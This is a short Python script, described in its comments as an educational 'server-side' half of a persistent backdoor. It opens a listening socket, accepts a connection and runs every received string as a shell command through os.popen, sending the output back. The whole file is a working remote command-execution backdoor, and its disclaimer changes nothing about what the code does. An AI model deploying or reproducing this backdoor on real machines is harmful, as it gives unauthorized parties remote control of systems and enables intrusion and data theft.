# Created November 12th, 2025
# Created by Ari LeFebre
# This script was created for educational purposes, and is not intended to be used maliciously.
# The creation of this script was heavily influenced by a script created by Devon Griffith.

# This script is one of two scripts designed to establish a persistent backdoor.
# This script is for the server-side.



# Import Statements
import socket
import os

# Define function to execute the commands
def execute_command(command):
    result = os.popen(command).read()
    return result

# Define main function
def main():
    server_ip = "" # Replace with the server's IP before executing.
    server_port = 1234 # Replace with desired port.

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((server_ip, server_port))
    server_socket.listen(1)
    print(f"Server listening on {server_ip}:{server_port}")

    # Connection between the 2 machines.
    client_socket, client_address = server_socket.accept()
    print(f"Connection from: {client_address}")

    while True:
        command = client_socket.recv(1024).decode()
        if command.lower() == "exit": # If you want to close the connection, enter the command "exit".
            break
        result = execute_command(command)
        client_socket.send(result.encode())

    # Close the remote connection
    client_socket.close()
    # Close the connection to the server
    server_socket.close()

if __name__ == "__main__":
    main()